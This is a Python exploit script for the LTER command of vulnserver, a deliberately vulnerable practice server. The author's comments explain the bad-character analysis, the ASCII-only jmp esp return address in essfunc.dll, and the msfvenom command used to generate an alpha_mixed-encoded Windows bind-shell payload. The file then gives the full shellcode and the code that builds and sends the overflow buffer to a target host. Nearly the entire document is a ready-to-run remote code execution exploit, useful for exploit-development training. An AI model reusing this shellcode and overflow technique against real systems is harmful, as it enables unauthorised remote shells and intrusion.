#!/usr/bin/python

import socket
import sys

host = "172.16.66.128"
port = 9999

#########################################
## WriTTen by: van6uard
## vulnserver LTER Exploit
## badchars = '\x00'
## Tested many return addresses, but only the ascii only addresses worked
## Log data, item 59 Address=625011BB
## Message=  62501205 : jmp esp |  ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\..\Desktop\vulnserver\essfunc.dll)
## Playing with bad characters, finally figured out it mangles everything after 7f, so researching leads to it only accepting ascii characters.
## We need to use an alpha/mixed encoder to use only ascii
## 
## msfvenom -a x86 --platform windows -p windows/shell/bind_tcp LPORT=4444 -e x86/alpha_mixed BufferRegister=ESP -f c -b '\x00'
## Found 1 compatible encoders
## Attempting to encode payload with 1 iterations of x86/alpha_mixed
## x86/alpha_mixed succeeded with size 672 (iteration=0)
## x86/alpha_mixed chosen with final size 672
## Payload size: 672 bytes
## Final size of c file: 2847 bytes
## unsigned char buf[] = 
#########################################

shellcode = (
"\x54\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
"\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b"
"\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58"
"\x50\x38\x41\x42\x75\x4a\x49\x4b\x4c\x68\x68\x4d\x52\x47\x70"
"\x55\x50\x73\x30\x65\x30\x6e\x69\x6d\x35\x55\x61\x6b\x70\x70"
"\x64\x4c\x4b\x36\x30\x54\x70\x4e\x6b\x61\x42\x66\x6c\x4c\x4b"
"\x76\x32\x46\x74\x4e\x6b\x71\x62\x44\x68\x44\x4f\x58\x37\x52"
"\x6a\x61\x36\x35\x61\x59\x6f\x6e\x4c\x35\x6c\x70\x61\x33\x4c"
"\x63\x32\x76\x4c\x61\x30\x5a\x61\x7a\x6f\x74\x4d\x33\x31\x38"
"\x47\x6d\x32\x49\x62\x56\x32\x46\x37\x6e\x6b\x66\x32\x52\x30"
"\x6c\x4b\x43\x7a\x35\x6c\x4e\x6b\x50\x4c\x36\x71\x71\x68\x5a"
"\x43\x52\x68\x73\x31\x6b\x61\x70\x51\x4e\x6b\x50\x59\x77\x50"
"\x43\x31\x4b\x63\x6c\x4b\x63\x79\x74\x58\x4d\x33\x47\x4a\x57"
"\x39\x6e\x6b\x75\x64\x4e\x6b\x43\x31\x38\x56\x56\x51\x79\x6f"
"\x6c\x6c\x39\x51\x68\x4f\x44\x4d\x56\x61\x4f\x37\x30\x38\x59"
"\x70\x63\x45\x49\x66\x34\x43\x51\x6d\x79\x68\x65\x6b\x63\x4d"
"\x67\x54\x32\x55\x48\x64\x63\x68\x6e\x6b\x42\x78\x64\x64\x63"
"\x31\x4a\x73\x73\x56\x4e\x6b\x56\x6c\x50\x4b\x6c\x4b\x46\x38"
"\x55\x4c\x53\x31\x6b\x63\x6c\x4b\x56\x64\x6e\x6b\x43\x31\x4a"
"\x70\x4b\x39\x31\x54\x34\x64\x44\x64\x31\x4b\x33\x6b\x75\x31"
"\x31\x49\x43\x6a\x76\x31\x79\x6f\x69\x70\x73\x6f\x43\x6f\x52"
"\x7a\x4c\x4b\x44\x52\x78\x6b\x6e\x6d\x51\x4d\x75\x38\x46\x53"
"\x47\x42\x73\x30\x77\x70\x30\x68\x51\x67\x30\x73\x65\x62\x63"
"\x6f\x52\x74\x71\x78\x52\x6c\x44\x37\x35\x76\x37\x77\x4b\x4f"
"\x49\x45\x58\x38\x6c\x50\x33\x31\x35\x50\x65\x50\x67\x59\x48"
"\x44\x36\x34\x72\x70\x61\x78\x54\x69\x4d\x50\x42\x4b\x75\x50"
"\x79\x6f\x4b\x65\x61\x7a\x66\x6b\x52\x79\x70\x50\x6a\x42\x39"
"\x6d\x70\x6a\x37\x71\x30\x6a\x44\x42\x33\x58\x4a\x4a\x76\x6f"
"\x79\x4f\x6b\x50\x39\x6f\x4b\x65\x6d\x47\x33\x58\x53\x32\x57"
"\x70\x64\x51\x53\x6c\x6e\x69\x38\x66\x30\x6a\x42\x30\x33\x66"
"\x52\x77\x65\x38\x48\x42\x49\x4b\x54\x77\x65\x37\x59\x6f\x78"
"\x55\x6f\x75\x59\x50\x63\x45\x73\x68\x72\x77\x71\x78\x4d\x67"
"\x6a\x49\x74\x78\x69\x6f\x79\x6f\x59\x45\x73\x67\x63\x58\x61"
"\x64\x5a\x4c\x67\x4b\x4d\x31\x69\x6f\x38\x55\x31\x47\x4e\x77"
"\x73\x58\x72\x55\x32\x4e\x62\x6d\x30\x61\x69\x6f\x78\x55\x53"
"\x5a\x47\x70\x61\x7a\x45\x54\x33\x66\x32\x77\x45\x38\x47\x72"
"\x59\x49\x4b\x78\x51\x4f\x49\x6f\x7a\x75\x6e\x63\x7a\x58\x77"
"\x70\x43\x4e\x66\x4d\x6e\x6b\x54\x76\x72\x4a\x63\x70\x30\x68"
"\x53\x30\x66\x70\x35\x50\x37\x70\x73\x66\x50\x6a\x37\x70\x35"
"\x38\x31\x48\x6e\x44\x66\x33\x7a\x45\x49\x6f\x48\x55\x5a\x33"
"\x76\x33\x63\x5a\x57\x70\x62\x76\x61\x43\x71\x47\x55\x38\x64"
"\x42\x59\x49\x49\x58\x71\x4f\x69\x6f\x48\x55\x6c\x43\x6b\x48"
"\x43\x30\x33\x4e\x44\x47\x63\x31\x38\x43\x36\x49\x5a\x66\x43"
"\x45\x59\x79\x7a\x63\x6f\x4b\x78\x70\x4e\x55\x39\x32\x30\x56"
"\x63\x5a\x33\x30\x32\x73\x79\x6f\x58\x55\x41\x41"
)

buf = 'LTER /.:/' + 'A'*2003 + '\x05\x12\x50\x62' + shellcode + 'D'*(3500-2003-4-12-len(shellcode)) + '\x00\x00'

try:
    c = socket.socket(socket.AF_INET,socket.SOCK_STREAM) #tcp socket
    c.connect((host, port))
    c.send(buf + '\r\n')
    print "[+] Evil buffer sent"
    c.close()

except:
    print "[-] Can't send evil buffer"
    sys.exit()
